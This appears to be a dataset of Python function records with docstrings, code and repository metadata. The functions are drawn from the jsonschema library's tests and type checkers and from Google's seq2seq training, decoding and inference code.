{"docstring": "\"\"\"\nSpecifically, `const` validation *does not* apply for Draft 4.\n\"\"\"\n", "func_signal": "def test_it_validates_using_draft4_when_specified(self):\n", "code": "schema = \"\"\"\n    {\n        \"$schema\": \"http://json-schema.org/draft-04/schema#\",\n        \"const\": \"check\"\n    }\n    \"\"\"\ninstance = '\"foo\"'\nself.assertOutputs(\n    files=dict(some_schema=schema, some_instance=instance),\n    argv=[\"-i\", \"some_instance\", \"some_schema\"],\n    stdout=\"\",\n    stderr=\"\",\n)", "path": "jsonschema/jsonschema/tests/test_cli.py", "commit_date": "2020-10-15 00:00:00", "repo_name": "python-jsonschema/jsonschema", "stars": 4388, "license": "mit", "language": "python", "size": 3278}
{"docstring": "# Avoid the help message on stdout\n", "func_signal": "def test_unknown_output(self):\n", "code": "with captured_output() as (stdout, stderr):\n    with self.assertRaises(SystemExit):\n        cli.parse_args(\n            [\n                \"--output\", \"foo\",\n                \"mem://some/schema\",\n            ]\n        )\nself.assertIn(\"invalid choice: 'foo'\", stderr.getvalue())\nself.assertFalse(stdout.getvalue())", "path": "jsonschema/jsonschema/tests/test_cli.py", "commit_date": "2020-10-15 00:00:00", "repo_name": "python-jsonschema/jsonschema", "stars": 4388, "license": "mit", "language": "python", "size": 3278}
{"docstring": "\"\"\"\nCheck for https://github.com/Julian/jsonschema/issues/164 which\nrendered exceptions unusable when a `ValidationError` involved\ninstances with an `__eq__` method that returned truthy values.\n\"\"\"\n\n", "func_signal": "def test_str_works_with_instances_having_overriden_eq_operator(self):\n", "code": "class DontEQMeBro(object):\n    def __eq__(this, other):  # pragma: no cover\n        self.fail(\"Don't!\")\n\n    def __ne__(this, other):  # pragma: no cover\n        self.fail(\"Don't!\")\n\ninstance = DontEQMeBro()\nerror = exceptions.ValidationError(\n    \"a message\",\n    validator=\"foo\",\n    instance=instance,\n    validator_value=\"some\",\n    schema=\"schema\",\n)\nself.assertIn(repr(instance), str(error))", "path": "jsonschema/jsonschema/tests/test_exceptions.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "python-jsonschema/jsonschema", "stars": 4388, "license": "mit", "language": "python", "size": 3278}
{"docstring": "\"\"\"\nProduce a new checker with the given types forgotten.\n\nArguments:\n\n    types (~collections.abc.Iterable):\n\n        the names of the types to remove.\n\nReturns:\n\n    A new `TypeChecker` instance\n\nRaises:\n\n    `jsonschema.exceptions.UndefinedTypeCheck`:\n\n        if any given type is unknown to this object\n\"\"\"\n\n", "func_signal": "def remove(self, *types):\n", "code": "checkers = self._type_checkers\nfor each in types:\n    try:\n        checkers = checkers.remove(each)\n    except KeyError:\n        raise UndefinedTypeCheck(each)\nreturn attr.evolve(self, type_checkers=checkers)", "path": "jsonschema/jsonschema/_types.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "python-jsonschema/jsonschema", "stars": 4388, "license": "mit", "language": "python", "size": 3278}
{"docstring": "\"\"\"\nProduce a new checker with the given types redefined.\n\nArguments:\n\n    definitions (dict):\n\n        A dictionary mapping types to their checking functions.\n\nReturns:\n\n    A new `TypeChecker` instance.\n\"\"\"\n", "func_signal": "def redefine_many(self, definitions=()):\n", "code": "return attr.evolve(\n    self, type_checkers=self._type_checkers.update(definitions),\n)", "path": "jsonschema/jsonschema/_types.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "python-jsonschema/jsonschema", "stars": 4388, "license": "mit", "language": "python", "size": 3278}
{"docstring": "\"\"\"\nCheck if the instance is of the appropriate type.\n\nArguments:\n\n    instance (object):\n\n        The instance to check\n\n    type (str):\n\n        The name of the type that is expected.\n\nReturns:\n\n    bool: Whether it conformed.\n\n\nRaises:\n\n    `jsonschema.exceptions.UndefinedTypeCheck`:\n        if type is unknown to this object.\n\"\"\"\n", "func_signal": "def is_type(self, instance, type):\n", "code": "try:\n    fn = self._type_checkers[type]\nexcept KeyError:\n    raise UndefinedTypeCheck(type)\n\nreturn fn(self, instance)", "path": "jsonschema/jsonschema/_types.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "python-jsonschema/jsonschema", "stars": 4388, "license": "mit", "language": "python", "size": 3278}
{"docstring": "\"\"\"\nA property you *must* match is probably better than one you have to\nmatch a part of.\n\"\"\"\n\n", "func_signal": "def test_oneOf_and_anyOf_are_weak_matches(self):\n", "code": "validator = Draft4Validator(\n    {\n        \"minProperties\": 2,\n        \"anyOf\": [{\"type\": \"string\"}, {\"type\": \"number\"}],\n        \"oneOf\": [{\"type\": \"string\"}, {\"type\": \"number\"}],\n    }\n)\nbest = self.best_match(validator.iter_errors({}))\nself.assertEqual(best.validator, \"minProperties\")", "path": "jsonschema/jsonschema/tests/test_exceptions.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "python-jsonschema/jsonschema", "stars": 4388, "license": "mit", "language": "python", "size": 3278}
{"docstring": "# Avoid the help message on stdout\n", "func_signal": "def test_useless_error_format(self):\n", "code": "with captured_output() as (stdout, stderr):\n    with self.assertRaises(SystemExit):\n        cli.parse_args(\n            [\n                \"--output\", \"pretty\",\n                \"--error-format\", \"foo\",\n                \"mem://some/schema\",\n            ]\n        )\nself.assertIn(\n    \"--error-format can only be used with --output plain\",\n    stderr.getvalue(),\n)\nself.assertFalse(stdout.getvalue())", "path": "jsonschema/jsonschema/tests/test_cli.py", "commit_date": "2020-10-15 00:00:00", "repo_name": "python-jsonschema/jsonschema", "stars": 4388, "license": "mit", "language": "python", "size": 3278}
{"docstring": "\"\"\"\n\"Validating\" an instance that's invalid under an invalid schema\njust shows the schema error.\n\"\"\"\n", "func_signal": "def test_invalid_schema_with_invalid_instance(self):\n", "code": "self.assertOutputs(\n    files=dict(\n        some_schema='{\"type\": 12, \"minimum\": 30}',\n        some_instance=\"13\",\n    ),\n    argv=[\"-i\", \"some_instance\", \"some_schema\"],\n\n    exit_code=1,\n    stderr=\"\"\"\\\n        12: 12 is not valid under any of the given schemas\n    \"\"\",\n)", "path": "jsonschema/jsonschema/tests/test_cli.py", "commit_date": "2020-10-15 00:00:00", "repo_name": "python-jsonschema/jsonschema", "stars": 4388, "license": "mit", "language": "python", "size": 3278}
{"docstring": "# FIXME: https://github.com/Julian/jsonschema/issues/442\n", "func_signal": "def test_it_knows_how_many_total_errors_it_contains(self):\n", "code": "errors = [\n    exceptions.ValidationError(\"Something\", validator=i)\n    for i in range(8)\n]\ntree = exceptions.ErrorTree(errors)\nself.assertEqual(tree.total_errors, 8)", "path": "jsonschema/jsonschema/tests/test_exceptions.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "python-jsonschema/jsonschema", "stars": 4388, "license": "mit", "language": "python", "size": 3278}
{"docstring": "\"\"\"\nIf the most relevant error is an anyOf, then we traverse its context\nand select the otherwise *least* relevant error, since in this case\nthat means the most specific, deep, error inside the instance.\n\nI.e. since only one of the schemas must match, we look for the most\nrelevant one.\n\"\"\"\n\n", "func_signal": "def test_if_the_most_relevant_error_is_anyOf_it_is_traversed(self):\n", "code": "validator = Draft4Validator(\n    {\n        \"properties\": {\n            \"foo\": {\n                \"anyOf\": [\n                    {\"type\": \"string\"},\n                    {\"properties\": {\"bar\": {\"type\": \"array\"}}},\n                ],\n            },\n        },\n    },\n)\nbest = self.best_match(validator.iter_errors({\"foo\": {\"bar\": 12}}))\nself.assertEqual(best.validator_value, \"array\")", "path": "jsonschema/jsonschema/tests/test_exceptions.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "python-jsonschema/jsonschema", "stars": 4388, "license": "mit", "language": "python", "size": 3278}
{"docstring": "# bool inherits from int, so ensure bools aren't reported as ints\n", "func_signal": "def is_number(checker, instance):\n", "code": "if isinstance(instance, bool):\n    return False\nreturn isinstance(instance, numbers.Number)", "path": "jsonschema/jsonschema/_types.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "python-jsonschema/jsonschema", "stars": 4388, "license": "mit", "language": "python", "size": 3278}
{"docstring": "\"\"\"\nIf a validator is dumb (like :validator:`required` in draft 3) and\nrefers to a path that isn't in the instance, the tree still properly\nreturns a subtree for that path.\n\"\"\"\n\n", "func_signal": "def test_if_its_in_the_tree_anyhow_it_does_not_raise_an_error(self):\n", "code": "error = exceptions.ValidationError(\n    \"a message\", validator=\"foo\", instance={}, path=[\"foo\"],\n)\ntree = exceptions.ErrorTree([error])\nself.assertIsInstance(tree[\"foo\"], exceptions.ErrorTree)", "path": "jsonschema/jsonschema/tests/test_exceptions.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "python-jsonschema/jsonschema", "stars": 4388, "license": "mit", "language": "python", "size": 3278}
{"docstring": "# This is bad :/ but relied upon.\n# The docs for quite awhile recommended people do things like\n# validate(..., format_checker=FormatChecker())\n# We should change that, but we can't without deprecation...\n", "func_signal": "def test_format_checkers_come_with_defaults(self):\n", "code": "checker = FormatChecker()\nwith self.assertRaises(FormatError):\n    checker.check(instance=\"not-an-ipv4\", format=\"ipv4\")", "path": "jsonschema/jsonschema/tests/test_format.py", "commit_date": "2020-08-12 00:00:00", "repo_name": "python-jsonschema/jsonschema", "stars": 4388, "license": "mit", "language": "python", "size": 3278}
{"docstring": "\"\"\"The computed learning rate decay function.\n\"\"\"\n", "func_signal": "def decay_fn(learning_rate, global_step):\n", "code": "global_step = tf.to_int32(global_step)\n\ndecay_type_fn = getattr(tf.train, decay_type)\ndecayed_learning_rate = decay_type_fn(\n    learning_rate=learning_rate,\n    global_step=tf.minimum(global_step, stop_decay_at) - start_decay_at,\n    decay_steps=decay_steps,\n    decay_rate=decay_rate,\n    staircase=staircase,\n    name=\"decayed_learning_rate\")\n\nfinal_lr = tf.train.piecewise_constant(\n    x=global_step,\n    boundaries=[start_decay_at],\n    values=[learning_rate, decayed_learning_rate])\n\nif min_learning_rate:\n  final_lr = tf.maximum(final_lr, min_learning_rate)\n\nreturn final_lr", "path": "seq2seq/seq2seq/training/utils.py", "commit_date": "2017-04-17 00:00:00", "repo_name": "google/seq2seq", "stars": 5590, "license": "apache-2.0", "language": "python", "size": 1666}
{"docstring": "\"\"\"Wraps the original decoder helper function to append the attention\ncontext.\n\"\"\"\n", "func_signal": "def att_next_inputs(time, outputs, state, sample_ids, name=None):\n", "code": "finished, next_inputs, next_state = helper.next_inputs(\n    time=time,\n    outputs=outputs,\n    state=state,\n    sample_ids=sample_ids,\n    name=name)\nnext_inputs = tf.concat([next_inputs, outputs.attention_context], 1)\nreturn (finished, next_inputs, next_state)", "path": "seq2seq/seq2seq/decoders/attention_decoder.py", "commit_date": "2017-03-21 00:00:00", "repo_name": "google/seq2seq", "stars": 5590, "license": "apache-2.0", "language": "python", "size": 1666}
{"docstring": "\"\"\"This decorator wraps a method with `tf.make_template`. For example,\n\n@templatemethod\ndef my_method():\n  # Create variables\n\"\"\"\n\n", "func_signal": "def templatemethod(name_):\n", "code": "def template_decorator(func):\n  \"\"\"Inner decorator function\"\"\"\n\n  def func_wrapper(*args, **kwargs):\n    \"\"\"Inner wrapper function\"\"\"\n    templated_func = tf.make_template(name_, func)\n    return templated_func(*args, **kwargs)\n\n  return func_wrapper\n\nreturn template_decorator", "path": "seq2seq/seq2seq/graph_utils.py", "commit_date": "2017-04-05 00:00:00", "repo_name": "google/seq2seq", "stars": 5590, "license": "apache-2.0", "language": "python", "size": 1666}
{"docstring": "\"\"\"Returns the length of the prediction based on the index\nof the first SEQUENCE_END token.\n\"\"\"\n", "func_signal": "def _get_prediction_length(predictions_dict):\n", "code": "tokens_iter = enumerate(predictions_dict[\"predicted_tokens\"])\nreturn next(((i + 1) for i, _ in tokens_iter if _ == \"SEQUENCE_END\"),\n            len(predictions_dict[\"predicted_tokens\"]))", "path": "seq2seq/seq2seq/tasks/decode_text.py", "commit_date": "2017-03-16 00:00:00", "repo_name": "google/seq2seq", "stars": 5590, "license": "apache-2.0", "language": "python", "size": 1666}
{"docstring": "\"\"\"Computes the decoder outputs.\"\"\"\n\n# Compute attention\n", "func_signal": "def compute_output(self, cell_output):\n", "code": "att_scores, attention_context = self.attention_fn(\n    query=cell_output,\n    keys=self.attention_keys,\n    values=self.attention_values,\n    values_length=self.attention_values_length)\n\n# TODO: Make this a parameter: We may or may not want this.\n# Transform attention context.\n# This makes the softmax smaller and allows us to synthesize information\n# between decoder state and attention context\n# see https://arxiv.org/abs/1508.04025v5\nsoftmax_input = tf.contrib.layers.fully_connected(\n    inputs=tf.concat([cell_output, attention_context], 1),\n    num_outputs=self.cell.output_size,\n    activation_fn=tf.nn.tanh,\n    scope=\"attention_mix\")\n\n# Softmax computation\nlogits = tf.contrib.layers.fully_connected(\n    inputs=softmax_input,\n    num_outputs=self.vocab_size,\n    activation_fn=None,\n    scope=\"logits\")\n\nreturn softmax_input, logits, att_scores, attention_context", "path": "seq2seq/seq2seq/decoders/attention_decoder.py", "commit_date": "2017-03-21 00:00:00", "repo_name": "google/seq2seq", "stars": 5590, "license": "apache-2.0", "language": "python", "size": 1666}
{"docstring": "\"\"\"\nCreates a new Experiment instance.\n\nArgs:\n  output_dir: Output directory for model checkpoints and summaries.\n\"\"\"\n\n", "func_signal": "def create_experiment(output_dir):\n", "code": "config = run_config.RunConfig(\n    tf_random_seed=FLAGS.tf_random_seed,\n    save_checkpoints_secs=FLAGS.save_checkpoints_secs,\n    save_checkpoints_steps=FLAGS.save_checkpoints_steps,\n    keep_checkpoint_max=FLAGS.keep_checkpoint_max,\n    keep_checkpoint_every_n_hours=FLAGS.keep_checkpoint_every_n_hours,\n    gpu_memory_fraction=FLAGS.gpu_memory_fraction)\nconfig.tf_config.gpu_options.allow_growth = FLAGS.gpu_allow_growth\nconfig.tf_config.log_device_placement = FLAGS.log_device_placement\n\ntrain_options = training_utils.TrainOptions(\n    model_class=FLAGS.model,\n    model_params=FLAGS.model_params)\n# On the main worker, save training options\nif config.is_chief:\n  gfile.MakeDirs(output_dir)\n  train_options.dump(output_dir)\n\nbucket_boundaries = None\nif FLAGS.buckets:\n  bucket_boundaries = list(map(int, FLAGS.buckets.split(\",\")))\n\n# Training data input pipeline\ntrain_input_pipeline = input_pipeline.make_input_pipeline_from_def(\n    def_dict=FLAGS.input_pipeline_train,\n    mode=tf.contrib.learn.ModeKeys.TRAIN)\n\n# Create training input function\ntrain_input_fn = training_utils.create_input_fn(\n    pipeline=train_input_pipeline,\n    batch_size=FLAGS.batch_size,\n    bucket_boundaries=bucket_boundaries,\n    scope=\"train_input_fn\")\n\n# Development data input pipeline\ndev_input_pipeline = input_pipeline.make_input_pipeline_from_def(\n    def_dict=FLAGS.input_pipeline_dev,\n    mode=tf.contrib.learn.ModeKeys.EVAL,\n    shuffle=False, num_epochs=1)\n\n# Create eval input function\neval_input_fn = training_utils.create_input_fn(\n    pipeline=dev_input_pipeline,\n    batch_size=FLAGS.batch_size,\n    allow_smaller_final_batch=True,\n    scope=\"dev_input_fn\")\n\n\ndef model_fn(features, labels, params, mode):\n  \"\"\"Builds the model graph\"\"\"\n  model = _create_from_dict({\n      \"class\": train_options.model_class,\n      \"params\": train_options.model_params\n  }, models, mode=mode)\n  return model(features, labels, params)\n\nestimator = tf.contrib.learn.Estimator(\n    model_fn=model_fn,\n    model_dir=output_dir,\n    config=config,\n    params=FLAGS.model_params)\n\n# Create hooks\ntrain_hooks = []\nfor dict_ in FLAGS.hooks:\n  hook = _create_from_dict(\n      dict_, hooks,\n      model_dir=estimator.model_dir,\n      run_config=config)\n  train_hooks.append(hook)\n\n# Create metrics\neval_metrics = {}\nfor dict_ in FLAGS.metrics:\n  metric = _create_from_dict(dict_, metric_specs)\n  eval_metrics[metric.name] = metric\n\nexperiment = PatchedExperiment(\n    estimator=estimator,\n    train_input_fn=train_input_fn,\n    eval_input_fn=eval_input_fn,\n    min_eval_frequency=FLAGS.eval_every_n_steps,\n    train_steps=FLAGS.train_steps,\n    eval_steps=None,\n    eval_metrics=eval_metrics,\n    train_monitors=train_hooks)\n\nreturn experiment", "path": "seq2seq/bin/train.py", "commit_date": "2017-04-17 00:00:00", "repo_name": "google/seq2seq", "stars": 5590, "license": "apache-2.0", "language": "python", "size": 1666}
{"docstring": "\"\"\"Utility function to read all available items from a DataProvider.\n\"\"\"\n", "func_signal": "def read_from_data_provider(data_provider):\n", "code": "item_values = data_provider.get(list(data_provider.list_items()))\nitems_dict = dict(zip(data_provider.list_items(), item_values))\nreturn items_dict", "path": "seq2seq/seq2seq/data/input_pipeline.py", "commit_date": "2017-03-16 00:00:00", "repo_name": "google/seq2seq", "stars": 5590, "license": "apache-2.0", "language": "python", "size": 1666}
{"docstring": "\"\"\"Program entry point.\n\"\"\"\n\n# Load flags from config file\n", "func_signal": "def main(_argv):\n", "code": "if FLAGS.config_path:\n  with gfile.GFile(FLAGS.config_path) as config_file:\n    config_flags = yaml.load(config_file)\n    for flag_key, flag_value in config_flags.items():\n      setattr(FLAGS, flag_key, flag_value)\n\nif isinstance(FLAGS.tasks, string_types):\n  FLAGS.tasks = _maybe_load_yaml(FLAGS.tasks)\n\nif isinstance(FLAGS.input_pipeline, string_types):\n  FLAGS.input_pipeline = _maybe_load_yaml(FLAGS.input_pipeline)\n\ninput_pipeline_infer = input_pipeline.make_input_pipeline_from_def(\n    FLAGS.input_pipeline, mode=tf.contrib.learn.ModeKeys.INFER,\n    shuffle=False, num_epochs=1)\n\n# Load saved training options\ntrain_options = training_utils.TrainOptions.load(FLAGS.model_dir)\n\n# Create the model\nmodel_cls = locate(train_options.model_class) or \\\n  getattr(models, train_options.model_class)\nmodel_params = train_options.model_params\nmodel_params = _deep_merge_dict(\n    model_params, _maybe_load_yaml(FLAGS.model_params))\nmodel = model_cls(\n    params=model_params,\n    mode=tf.contrib.learn.ModeKeys.INFER)\n\n# Load inference tasks\nhooks = []\nfor tdict in FLAGS.tasks:\n  if not \"params\" in tdict:\n    tdict[\"params\"] = {}\n  task_cls = locate(tdict[\"class\"]) or getattr(tasks, tdict[\"class\"])\n  task = task_cls(tdict[\"params\"])\n  hooks.append(task)\n\n# Create the graph used for inference\npredictions, _, _ = create_inference_graph(\n    model=model,\n    input_pipeline=input_pipeline_infer,\n    batch_size=FLAGS.batch_size)\n\nsaver = tf.train.Saver()\ncheckpoint_path = FLAGS.checkpoint_path\nif not checkpoint_path:\n  checkpoint_path = tf.train.latest_checkpoint(FLAGS.model_dir)\n\ndef session_init_op(_scaffold, sess):\n  saver.restore(sess, checkpoint_path)\n  tf.logging.info(\"Restored model from %s\", checkpoint_path)\n\nscaffold = tf.train.Scaffold(init_fn=session_init_op)\nsession_creator = tf.train.ChiefSessionCreator(scaffold=scaffold)\nwith tf.train.MonitoredSession(\n    session_creator=session_creator,\n    hooks=hooks) as sess:\n\n  # Run until the inputs are exhausted\n  while not sess.should_stop():\n    sess.run([])", "path": "seq2seq/bin/infer.py", "commit_date": "2017-03-16 00:00:00", "repo_name": "google/seq2seq", "stars": 5590, "license": "apache-2.0", "language": "python", "size": 1666}
{"docstring": "\"\"\"Tests training and inference scripts.\n\"\"\"\n# Create dummy data\n", "func_signal": "def test_train_infer(self):\n", "code": "sources_train, targets_train = test_utils.create_temp_parallel_data(\n    sources=[\"a a a a\", \"b b b b\", \"c c c c\", \"\u7b11 \u7b11 \u7b11 \u7b11\"],\n    targets=[\"b b b b\", \"a a a a\", \"c c c c\", \"\u6ce3 \u6ce3 \u6ce3 \u6ce3\"])\nsources_dev, targets_dev = test_utils.create_temp_parallel_data(\n    sources=[\"a a\", \"b b\", \"c c c\", \"\u7b11 \u7b11 \u7b11\"],\n    targets=[\"b b\", \"a a\", \"c c c\", \"\u6ce3 \u6ce3 \u6ce3\"])\nvocab_source = test_utils.create_temporary_vocab_file([\"a\", \"b\", \"c\", \"\u7b11\"])\nvocab_target = test_utils.create_temporary_vocab_file([\"a\", \"b\", \"c\", \"\u6ce3\"])\n\n_clear_flags()\ntf.reset_default_graph()\ntrain_script = imp.load_source(\"seq2seq.test.train_bin\",\n                               os.path.join(BIN_FOLDER, \"train.py\"))\n\n# Set training flags\ntf.app.flags.FLAGS.output_dir = self.output_dir\ntf.app.flags.FLAGS.hooks = \"\"\"\n  - class: PrintModelAnalysisHook\n  - class: MetadataCaptureHook\n  - class: TrainSampleHook\n\"\"\"\ntf.app.flags.FLAGS.metrics = \"\"\"\n  - class: LogPerplexityMetricSpec\n  - class: BleuMetricSpec\n  - class: RougeMetricSpec\n    params:\n      rouge_type: rouge_1/f_score\n\"\"\"\ntf.app.flags.FLAGS.model = \"AttentionSeq2Seq\"\ntf.app.flags.FLAGS.model_params = \"\"\"\nattention.params:\n  num_units: 10\nvocab_source: {}\nvocab_target: {}\n\"\"\".format(vocab_source.name, vocab_target.name)\ntf.app.flags.FLAGS.batch_size = 2\n\n# We pass a few flags via a config file\nconfig_path = os.path.join(self.output_dir, \"train_config.yml\")\nwith gfile.GFile(config_path, \"w\") as config_file:\n  yaml.dump({\n      \"input_pipeline_train\": {\n          \"class\": \"ParallelTextInputPipeline\",\n          \"params\": {\n              \"source_files\": [sources_train.name],\n              \"target_files\": [targets_train.name],\n          }\n      },\n      \"input_pipeline_dev\": {\n          \"class\": \"ParallelTextInputPipeline\",\n          \"params\": {\n              \"source_files\": [sources_dev.name],\n              \"target_files\": [targets_dev.name],\n          }\n      },\n      \"train_steps\": 50,\n      \"model_params\": {\n          \"embedding.dim\": 10,\n          \"decoder.params\": {\n              \"rnn_cell\": {\n                  \"cell_class\": \"GRUCell\",\n                  \"cell_params\": {\n                      \"num_units\": 8\n                  }\n              }\n          },\n          \"encoder.params\": {\n              \"rnn_cell\": {\n                  \"cell_class\": \"GRUCell\",\n                  \"cell_params\": {\n                      \"num_units\": 8\n                  }\n              }\n          }\n      }\n  }, config_file)\n\ntf.app.flags.FLAGS.config_paths = config_path\n\n# Run training\ntf.logging.set_verbosity(tf.logging.INFO)\ntrain_script.main([])\n\n# Make sure a checkpoint was written\nexpected_checkpoint = os.path.join(self.output_dir,\n                                   \"model.ckpt-50.data-00000-of-00001\")\nself.assertTrue(os.path.exists(expected_checkpoint))\n\n# Reset flags and import inference script\n_clear_flags()\ntf.reset_default_graph()\ninfer_script = imp.load_source(\"seq2seq.test.infer_bin\",\n                               os.path.join(BIN_FOLDER, \"infer.py\"))\n\n# Set inference flags\nattention_dir = os.path.join(self.output_dir, \"att\")\ntf.app.flags.FLAGS.model_dir = self.output_dir\ntf.app.flags.FLAGS.input_pipeline = \"\"\"\n  class: ParallelTextInputPipeline\n  params:\n    source_files:\n      - {}\n    target_files:\n      - {}\n\"\"\".format(sources_dev.name, targets_dev.name)\ntf.app.flags.FLAGS.batch_size = 2\ntf.app.flags.FLAGS.checkpoint_path = os.path.join(self.output_dir,\n                                                  \"model.ckpt-50\")\n\n# Use DecodeText Task\ntf.app.flags.FLAGS.tasks = \"\"\"\n- class: DecodeText\n- class: DumpAttention\n  params:\n    output_dir: {}\n\"\"\".format(attention_dir)\n\n# Make sure inference runs successfully\ninfer_script.main([])\n\n# Make sure attention scores and visualizations exist\nself.assertTrue(\n    os.path.exists(os.path.join(attention_dir, \"attention_scores.npz\")))\nself.assertTrue(os.path.exists(os.path.join(attention_dir, \"00002.png\")))\n\n# Load attention scores and assert shape\nscores = np.load(os.path.join(attention_dir, \"attention_scores.npz\"))\nself.assertIn(\"arr_0\", scores)\nself.assertEqual(scores[\"arr_0\"].shape[1], 3)\nself.assertIn(\"arr_1\", scores)\nself.assertEqual(scores[\"arr_1\"].shape[1], 3)\nself.assertIn(\"arr_2\", scores)\nself.assertEqual(scores[\"arr_2\"].shape[1], 4)\nself.assertIn(\"arr_3\", scores)\nself.assertEqual(scores[\"arr_3\"].shape[1], 4)\n\n# Test inference with beam search\n_clear_flags()\ntf.reset_default_graph()\ninfer_script = imp.load_source(\"seq2seq.test.infer_bin\",\n                               os.path.join(BIN_FOLDER, \"infer.py\"))\n\n# Set inference flags\ntf.app.flags.FLAGS.model_dir = self.output_dir\ntf.app.flags.FLAGS.input_pipeline = \"\"\"\n  class: ParallelTextInputPipeline\n  params:\n    source_files:\n      - {}\n    target_files:\n      - {}\n\"\"\".format(sources_dev.name, targets_dev.name)\ntf.app.flags.FLAGS.batch_size = 2\ntf.app.flags.FLAGS.checkpoint_path = os.path.join(self.output_dir,\n                                                  \"model.ckpt-50\")\ntf.app.flags.FLAGS.model_params = \"\"\"\n  inference.beam_search.beam_width: 5\n\"\"\"\ntf.app.flags.FLAGS.tasks = \"\"\"\n- class: DecodeText\n  params:\n    postproc_fn: seq2seq.data.postproc.decode_sentencepiece\n- class: DumpBeams\n  params:\n    file: {}\n\"\"\".format(os.path.join(self.output_dir, \"beams.npz\"))\n\n# Run inference w/ beam search\ninfer_script.main([])\nself.assertTrue(os.path.exists(os.path.join(self.output_dir, \"beams.npz\")))", "path": "seq2seq/seq2seq/test/pipeline_test.py", "commit_date": "2017-03-29 00:00:00", "repo_name": "google/seq2seq", "stars": 5590, "license": "apache-2.0", "language": "python", "size": 1666}
{"docstring": "\"\"\"Dumps the options to a file in the model directory.\n\nArgs:\n  model_dir: Path to the model directory. The options will be\n  dumped into a file in this directory.\n\"\"\"\n", "func_signal": "def dump(self, model_dir):\n", "code": "gfile.MakeDirs(model_dir)\noptions_dict = {\n    \"model_class\": self.model_class,\n    \"model_params\": self.model_params,\n}\n\nwith gfile.GFile(TrainOptions.path(model_dir), \"wb\") as file:\n  file.write(json.dumps(options_dict).encode(\"utf-8\"))", "path": "seq2seq/seq2seq/training/utils.py", "commit_date": "2017-04-17 00:00:00", "repo_name": "google/seq2seq", "stars": 5590, "license": "apache-2.0", "language": "python", "size": 1666}
{"docstring": "\"\"\"Create a RNN Cell instance from a JSON string.\n\nArgs:\n  cell_classname: Name of the cell class, e.g. \"BasicLSTMCell\".\n  cell_params: A dictionary of parameters to pass to the cell constructor.\n\nReturns:\n  A RNNCell instance.\n\"\"\"\n\n", "func_signal": "def cell_from_spec(cell_classname, cell_params):\n", "code": "cell_params = cell_params.copy()\n\n# Find the cell class\ncell_class = locate(cell_classname) or getattr(rnn_cell, cell_classname)\n\n# Make sure additional arguments are valid\ncell_args = set(inspect.getargspec(cell_class.__init__).args[1:])\nfor key in cell_params.keys():\n  if key not in cell_args:\n    raise ValueError(\n        \"\"\"{} is not a valid argument for {} class. Available arguments\n        are: {}\"\"\".format(key, cell_class.__name__, cell_args))\n\n# Create cell\nreturn cell_class(**cell_params)", "path": "seq2seq/seq2seq/training/utils.py", "commit_date": "2017-04-17 00:00:00", "repo_name": "google/seq2seq", "stars": 5590, "license": "apache-2.0", "language": "python", "size": 1666}
{"docstring": "\"\"\"Adds a dictionary to a graph collection.\n\nArgs:\n  dict_: A dictionary of string keys to tensor values\n  collection_name: The name of the collection to add the dictionary to\n\"\"\"\n", "func_signal": "def add_dict_to_collection(dict_, collection_name):\n", "code": "key_collection = collection_name + \"_keys\"\nvalue_collection = collection_name + \"_values\"\nfor key, value in dict_.items():\n  tf.add_to_collection(key_collection, key)\n  tf.add_to_collection(value_collection, value)", "path": "seq2seq/seq2seq/graph_utils.py", "commit_date": "2017-04-05 00:00:00", "repo_name": "google/seq2seq", "stars": 5590, "license": "apache-2.0", "language": "python", "size": 1666}
{"docstring": "\"\"\" Loads options from the given model directory.\n\nArgs:\n  model_dir: Path to the model directory.\n\"\"\"\n", "func_signal": "def load(model_dir):\n", "code": "with gfile.GFile(TrainOptions.path(model_dir), \"rb\") as file:\n  options_dict = json.loads(file.read().decode(\"utf-8\"))\noptions_dict = defaultdict(None, options_dict)\n\nreturn TrainOptions(\n    model_class=options_dict[\"model_class\"],\n    model_params=options_dict[\"model_params\"])", "path": "seq2seq/seq2seq/training/utils.py", "commit_date": "2017-04-17 00:00:00", "repo_name": "google/seq2seq", "stars": 5590, "license": "apache-2.0", "language": "python", "size": 1666}
{"docstring": "\"\"\"Creates features and labels.\n\"\"\"\n\n", "func_signal": "def input_fn():\n", "code": "with tf.variable_scope(scope or \"input_fn\"):\n  data_provider = pipeline.make_data_provider()\n  features_and_labels = pipeline.read_from_data_provider(data_provider)\n\n  if bucket_boundaries:\n    _, batch = tf.contrib.training.bucket_by_sequence_length(\n        input_length=features_and_labels[\"source_len\"],\n        bucket_boundaries=bucket_boundaries,\n        tensors=features_and_labels,\n        batch_size=batch_size,\n        keep_input=features_and_labels[\"source_len\"] >= 1,\n        dynamic_pad=True,\n        capacity=5000 + 16 * batch_size,\n        allow_smaller_final_batch=allow_smaller_final_batch,\n        name=\"bucket_queue\")\n  else:\n    batch = tf.train.batch(\n        tensors=features_and_labels,\n        enqueue_many=False,\n        batch_size=batch_size,\n        dynamic_pad=True,\n        capacity=5000 + 16 * batch_size,\n        allow_smaller_final_batch=allow_smaller_final_batch,\n        name=\"batch_queue\")\n\n  # Separate features and labels\n  features_batch = {k: batch[k] for k in pipeline.feature_keys}\n  if set(batch.keys()).intersection(pipeline.label_keys):\n    labels_batch = {k: batch[k] for k in pipeline.label_keys}\n  else:\n    labels_batch = None\n\n  return features_batch, labels_batch", "path": "seq2seq/seq2seq/training/utils.py", "commit_date": "2017-04-17 00:00:00", "repo_name": "google/seq2seq", "stars": 5590, "license": "apache-2.0", "language": "python", "size": 1666}
